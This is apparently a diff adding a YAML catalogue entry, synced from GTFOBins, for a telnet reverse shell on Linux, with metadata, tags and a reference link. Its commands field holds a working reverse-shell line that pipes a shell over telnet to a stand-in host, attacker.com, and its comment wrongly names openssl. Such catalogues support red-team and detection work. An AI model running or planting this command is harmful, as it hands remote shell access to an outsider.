@@ -1,0 +1,27 @@
+id: gtfobins/telnet/reverse-shell/unprivileged
+type: binary
+platform: linux
+name: telnet
+phases:
+- execution
+- command-and-control
+capabilities:
+- reverse-shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'mkfifo /path/to/temp-socket
+
+    telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket'
+  comment: The shell process is not spawn by `openssl`.
+references:
+- https://gtfobins.github.io/gtfobins/telnet/
+tags:
+- linux
+- unix
+- gtfobins
